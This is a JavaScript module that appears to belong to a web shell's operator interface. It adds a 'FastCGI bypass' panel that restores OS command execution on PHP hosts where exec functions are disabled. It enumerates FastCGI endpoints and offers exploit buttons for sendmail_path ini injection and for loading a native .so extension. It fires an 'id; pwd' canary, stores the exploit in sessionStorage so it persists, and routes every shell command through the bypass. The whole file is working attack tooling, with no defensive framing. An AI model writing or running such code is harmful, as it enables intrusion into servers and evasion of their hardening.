// ==================== FASTCGI BYPASS PANEL ====================
// Renders on the Shell card when the OS shell probe finds every exec
// function disabled. Offers the FastCGI takeover techniques as explicit
// exploit buttons; a successful exploit re-enables the OS shell input and
// routes every command through the bypass — each command is a full,
// self-cleaning cycle (pre-heal -> probe -> exploit -> verify cleanup).
//
// A successful exploit is remembered in sessionStorage (technique +
// endpoint + .so path), so a page reload silently re-validates and
// re-enables the shell instead of forcing the operator to re-exploit.

const BYPASS_STATE_KEY = 'sx.bypass';

const Bypass = {
  ep: '',        // chosen FastCGI endpoint
  tech: '',      // technique that succeeded: 't1' | 't2'
  so: '',        // t2: path to the ABI-matched module on the target
  busy: false,

  out(type, text) { streamAppend('os-shell-output', type, text); },

  saveState() {
    try {
      sessionStorage.setItem(BYPASS_STATE_KEY, JSON.stringify({ tech: this.tech, ep: this.ep, so: this.so }));
    } catch (e) { /* storage unavailable — state just won't survive reload */ }
  },

  loadState() {
    try { return JSON.parse(sessionStorage.getItem(BYPASS_STATE_KEY) || 'null'); }
    catch (e) { return null; }
  },

  clearState() {
    try { sessionStorage.removeItem(BYPASS_STATE_KEY); } catch (e) {}
  },

  // Entry point — called by terminal_shell.js when exec probing failed.
  show() {
    const panel = document.getElementById('bypass-panel');
    if (!panel) return;
    const saved = this.loadState();
    if (saved && saved.tech && saved.ep) {
      // previous successful exploit — re-validate quietly, re-enable on success
      panel.hidden = false;
      panel.innerHTML = '<span style="color:var(--muted)">&#8635; restoring previous bypass session (' +
        escHtml(saved.tech.toUpperCase()) + ' on ' + escHtml(saved.ep) + ')&hellip;</span>';
      this.tech = saved.tech;
      this.ep = saved.ep;
      this.so = saved.so || '';
      this.validateSaved(saved)
        .then(ok => { if (!ok) { this.clearState(); this.discover(); } })
        .catch(() => { this.clearState(); this.discover(); });
      return;
    }
    this.discover();
  },

  // Re-run the probe + canary against the saved endpoint/technique. On
  // success the shell is enabled again (exploit() already prints a compact
  // restore log); resolves false when the saved state no longer works.
  validateSaved(saved) {
    return this.exploit(saved.tech, true);
  },

  discover() {
    const panel = document.getElementById('bypass-panel');
    if (!panel) return;
    panel.hidden = false;
    panel.innerHTML = '<span style="color:var(--muted)">&#8987; enumerating FastCGI endpoints&hellip;</span>';
    const fd = new FormData();
    fd.append('action', 'bypass');
    fd.append('mode', 'discover');
    fetchJSON(fd)
      .then(data => this.render(data))
      .catch(e => {
        panel.innerHTML = '';
        this.out('err', '[bypass] discovery request failed: ' + String(e.message || e));
      });
  },

  render(data) {
    const panel = document.getElementById('bypass-panel');
    if (!panel) return;
    panel.innerHTML = '';
    if (!data.ok || !data.endpoints || !data.endpoints.length) {
      panel.innerHTML = '<span class="badge badge-no">&#x2716; FastCGI takeover: no endpoint found</span>'
        + '<span style="color:var(--muted)">not exploitable from this uid</span>';
      this.out('err', '[bypass] no FastCGI endpoint identified from this uid — not exploitable here');
      return;
    }
    // Endpoint picker — defaults to the first identified pool.
    this.ep = data.endpoints[0].ep;
    const row = document.createElement('div');
    row.style.cssText = 'display:flex;gap:8px;align-items:center;flex-wrap:wrap';

    const label = document.createElement('span');
    label.style.color = 'var(--muted)';
    label.textContent = 'exec disabled — FastCGI takeover:';
    row.appendChild(label);

    const sel = document.createElement('select');
    sel.id = 'bypass-ep';
    sel.style.cssText = 'background:transparent;color:inherit;border:1px solid var(--border);border-radius:6px;padding:3px 6px;font-size:12px';
    data.endpoints.forEach(e => {
      const o = document.createElement('option');
      o.value = e.ep;
      o.textContent = e.ep + (e.info ? ' (' + e.info + ')' : '');
      sel.appendChild(o);
    });
    sel.addEventListener('change', () => { this.ep = sel.value; });
    row.appendChild(sel);

    // Technique T1 — pure ini injection, no target-side artifact needed.
    const b1 = document.createElement('button');
    b1.type = 'button';
    b1.className = 'btn btn-sm btn-secondary';
    b1.textContent = 'Exploit: sendmail_path + mail()';
    b1.addEventListener('click', () => this.exploit('t1'));
    row.appendChild(b1);

    // Technique T2 — needs an ABI-matched module path on the target.
    const so = document.createElement('input');
    so.id = 'bypass-so';
    so.type = 'text';
    so.placeholder = '/path/to/poc_ext.so (ABI-matched, optional)';
    so.style.cssText = 'background:transparent;color:inherit;border:1px solid var(--border);border-radius:6px;padding:3px 6px;font-size:12px;width:260px';
    row.appendChild(so);

    const b2 = document.createElement('button');
    b2.type = 'button';
    b2.className = 'btn btn-sm btn-secondary';
    b2.textContent = 'Exploit: load extension (.so)';
    b2.addEventListener('click', () => this.exploit('t2'));
    row.appendChild(b2);

    panel.appendChild(row);
    data.endpoints.forEach(e =>
      this.out('out', '[bypass] endpoint: ' + e.ep + '  — identified via ' + e.method + (e.info ? ' (' + e.info + ')' : '')));
  },

  exploit(tech, restoring = false) {
    if (this.busy) return Promise.resolve(false);
    this.busy = true;
    const soEl = document.getElementById('bypass-so');
    if (!restoring) this.so = soEl ? soEl.value.trim() : '';
    streamSep('os-shell-output');
    this.out('cmd', '[bypass] ' + (restoring ? 're-validating' : 'technique') + ' ' + tech.toUpperCase()
      + (restoring ? '' : ' — ' + (tech === 't1'
          ? 'PHP_VALUE sendmail_path + mail()/error_log() trigger'
          : 'PHP_ADMIN_VALUE extension loading (native poc_exec)')));
    if (tech === 't2' && !this.so) {
      this.out('err', '[bypass] T2 needs the path to an ABI-matched poc_ext.so on the target (upload it via Files first)');
      this.busy = false;
      return Promise.resolve(false);
    }
    this.out('out', '[*] probing ' + this.ep + ' ...');
    const fd = new FormData();
    fd.append('action', 'bypass');
    fd.append('mode', 'probe');
    fd.append('ep', this.ep);
    return fetchJSON(fd)
      .then(pr => {
        if (!pr.ok) { this.out('err', '[!] probe failed: ' + (pr.error || 'unknown')); throw 0; }
        this.out('out', '    worker: PHP ' + pr.php + ' zts=' + (pr.zts ? 1 : 0) + ' uid=' + pr.uid);
        this.out('out', '    ini injection: ' + (pr.injection ? 'WORKS' : 'DOES NOT WORK'));
        this.out('out', '    triggers: mail()=' + (pr.mail ? 'yes' : 'no') + ' error_log()=' + (pr.error_log ? 'yes' : 'no'));
        if (!pr.injection) { this.out('err', '[!] per-request ini injection not honored — technique unavailable'); throw 0; }
        if (tech === 't1' && !pr.mail && !pr.error_log) { this.out('err', '[!] no trigger function available — T1 unavailable'); throw 0; }
        // Canary run proves execution end-to-end (command + output + cleanup).
        this.out('out', '[*] firing canary (id; pwd) ...');
        const rf = new FormData();
        rf.append('action', 'bypass');
        rf.append('mode', 'run');
        rf.append('tech', tech);
        rf.append('ep', this.ep);
        rf.append('so', this.so);
        rf.append('cmd', 'id; pwd');
        rf.append('timeout', '60');
        rf.append('cwd', document.getElementById('os-shell-prompt').textContent.replace(/ \$$/, '') || '.');
        return fetchJSON(rf);
      })
      .then(rr => {
        if (!rr || !rr.available) {
          this.out('err', '[!] exploit failed: ' + ((rr && rr.error) || 'no output'));
          throw 0;
        }
        (rr.output || '').split('\n').forEach(l => this.out('out', '    ' + l));
        this.out('out', '[+] ' + (rr.cleanup_verified ? 'worker ini restored (cleanup verified)' : 'warning: cleanup not verified'));
        this.out('out', '[+] ' + (restoring ? 'PREVIOUS SESSION RESTORED — OS shell re-enabled via '
          : 'EXPLOIT SUCCESSFUL — OS shell enabled via ') + rr.method);
        this.tech = tech;
        this.saveState();
        this.enableShell(rr.method, rr.cwd);
        return true;
      })
      .catch(e => {
        if (e !== 0) this.out('err', '[!] request failed: ' + String(e && e.message || e));
        return false;
      })
      .finally(() => { this.busy = false; });
  },

  // Re-enable the OS shell input, routing commands through the bypass.
  enableShell(method, cwd) {
    const status = document.getElementById('os-shell-status');
    const input = document.getElementById('os-shell-input');
    const prompt = document.getElementById('os-shell-prompt');
    if (cwd) { shellCwd = cwd; }
    status.innerHTML = '<span class="badge badge-ok">&#x2714; OS shell via <b>' + escHtml(method) + '</b> (FastCGI bypass)</span>';
    input.disabled = false;
    prompt.textContent = shellCwd + ' $';
    input.placeholder = 'shell command (via FastCGI bypass)  ·  Enter runs  ·  Shift+Enter newline  ·  ↑/↓ history  ·  Ctrl+L clear';
    const panel = document.getElementById('bypass-panel');
    if (panel) panel.hidden = true;   // collapse — exploit buttons return after reload
    shellAvailable = true;
    shellMethod = method;
    Terminal.bind({
      id:             'shell',
      displayName:    'Shell',
      prompt:         '$',
      contPrompt:     ' ',
      hintsLabel:     null,
      snippets:       [],
      outputEl:       'os-shell-output',
      inputEl:        'os-shell-input',
      snippetEl:      'shell-snippet-buttons',
      downloadPrefix: 'os-shell',
      historyMarker:  '$ ',
      runAction:      'bypass',
      codeField:      'cmd',
      timeoutField:   'timeout',
      timeoutValue:   '30',
      gate:           () => shellAvailable,
      echoPrefix:     () => shellCwd + ' $',
      beforeRun:      (fd) => {
        fd.append('mode', 'run');
        fd.append('tech', Bypass.tech);
        fd.append('ep', Bypass.ep);
        if (Bypass.tech === 't2') fd.append('so', Bypass.so);
        fd.append('cwd', shellCwd);
      },
      afterRun:       (data) => {
        if (data.cwd) {
          shellCwd = data.cwd;
          document.getElementById('os-shell-prompt').textContent = shellCwd + ' $';
        }
        if (data.truncated) {
          streamAppend('os-shell-output', 'err', '[output truncated — exceeded 5MB limit]');
        }
        if (data.available && !data.cleanup_verified) {
          streamAppend('os-shell-output', 'err', '[warning] worker cleanup not verified on this command');
        }
      },
    });
    input.focus();
  },
};

window.Bypass = Bypass;
